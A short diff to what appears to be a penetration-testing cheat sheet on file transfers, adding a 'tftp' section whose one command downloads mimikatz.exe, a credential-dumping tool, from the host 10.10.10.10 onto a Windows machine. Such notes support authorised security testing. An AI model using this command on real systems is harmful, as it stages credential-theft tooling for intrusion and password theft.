@@ -245,3 +245,7 @@ ftp -s:script.txt
 Links:
 
 https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
+
+## tftp
+
+`tftp -i 10.10.10.10 get mimikatz.exe`
